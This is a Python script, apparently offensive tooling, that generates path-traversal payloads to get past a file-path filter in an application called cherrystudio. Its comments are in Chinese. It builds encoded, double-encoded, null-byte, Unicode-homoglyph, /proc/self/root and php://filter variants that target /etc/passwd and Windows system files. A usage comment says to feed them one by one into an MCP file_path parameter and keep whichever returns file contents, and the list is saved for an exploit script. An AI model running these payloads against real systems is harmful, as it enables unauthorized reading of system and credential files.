#!/usr/bin/env python3
"""
Path Traversal Fuzzer — Level 1
================================
基于 cherrystudio 漏洞 — 自动生成路径变体绕过过滤

原理:
  已知 cherrystudio 用 open(file_path) 读文件
  如果目标加了过滤(validate_safe_path)，如何绕过？
  用编码/嵌套/Unicode 变体尝试读取 /etc/passwd
"""

import urllib.parse
import itertools

# 目标文件
TARGET = "/etc/passwd"

# ═══════════════════════════════════════════
# 绕过技术 1: 路径穿越变体
# ═══════════════════════════════════════════
traversals = [
    # 基础穿越
    "../../../.." + TARGET,
    "....//....//....//....//" + TARGET,
    "..\\..\\..\\..\\" + TARGET,
    
    # 绝对路径
    TARGET,
    "file://" + TARGET,
    "file:" + TARGET,
    
    # 编码绕过
    urllib.parse.quote(TARGET),                    # %2Fetc%2Fpasswd
    urllib.parse.quote(TARGET, safe=''),            # %2F%65%74%63...
    urllib.parse.quote_plus(TARGET),                # %2Fetc%2Fpasswd+
    
    # 双重编码
    urllib.parse.quote(urllib.parse.quote(TARGET)),  # %252Fetc%252Fpasswd
    
    # 空字节截断
    TARGET + "%00",
    TARGET + "%00.jpg",
    TARGET + "\x00",
    
    # Unicode 变体
    TARGET.replace("/", "\u2215"),    # ∕etc∕passwd
    TARGET.replace("/", "\u2044"),    # ⁄etc⁄passwd
    TARGET.replace(".", "\u2024"),    # /etc∕passwd (one dot leader)
    
    # 大小写变体 (Windows)
    TARGET.upper(),
    "/Etc/Passwd",
    
    # symlink 技巧
    "/proc/self/root" + TARGET,
    "/proc/1/root" + TARGET,
    
    # PHP 风格
    "php://filter/read=convert.base64-encode/resource=" + TARGET,
    "expect://" + TARGET,
]

# ═══════════════════════════════════════════
# 绕过技术 2: Windows 特定路径
# ═══════════════════════════════════════════
windows_targets = [
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "\\\\.\\C:\\Windows\\win.ini",           # NT device
    "\\\\?\\C:\\Windows\\win.ini",           # UNC
    "C:\\Windows\\..\\Windows\\win.ini",     # canonicalization
    "C:\\Windows\\.\\win.ini",
]

# ═══════════════════════════════════════════
# 绕过技术 3: 空字节 + 扩展名伪装
# ═══════════════════════════════════════════
null_byte_targets = []
for ext in [".jpg", ".png", ".txt", ".md", ".pdf", ".html"]:
    for t in [TARGET, "../../.." + TARGET]:
        null_byte_targets.append(t + "%00" + ext)
        null_byte_targets.append(t + "\x00" + ext)

# ═══════════════════════════════════════════
# 绕过技术 4: Unicode 归一化
# ═══════════════════════════════════════════
unicode_variants = []
chars = {".": ["\u2024", "\u2025", "\u2026", "\u3002"],
         "/": ["\u2215", "\u2044", "\uFF0F", "\u2571"],
         "e": ["\u0435", "\u0454", "\u1eb9"]}

for char, variants in chars.items():
    for v in variants:
        unicode_variants.append(TARGET.replace(char, v))

# ═══════════════════════════════════════════
# 生成完整 payload 列表
# ═══════════════════════════════════════════
all_payloads = (
    traversals + 
    windows_targets + 
    null_byte_targets +
    unicode_variants
)

# 去重
all_payloads = list(set(all_payloads))

print(f"Generated {len(all_payloads)} path traversal variants")
print(f"Target: {TARGET}")
print()
print("Top 10 payloads:")
for p in all_payloads[:10]:
    print(f"  {p}")
print(f"  ... and {len(all_payloads) - 10} more")

# ═══════════════════════════════════════════
# 用法:
# 将 all_payloads 逐个传入 MCP file_path 参数
# 检查哪个返回了文件内容（说明绕过了过滤）
# ═══════════════════════════════════════════

if __name__ == "__main__":
    import json
    # 保存为 JSON 供 exploit 脚本使用
    with open("path_payloads.json", "w") as f:
        json.dump({"target": TARGET, "payloads": all_payloads, "count": len(all_payloads)}, f, indent=2)
    print(f"\nSaved to path_payloads.json")
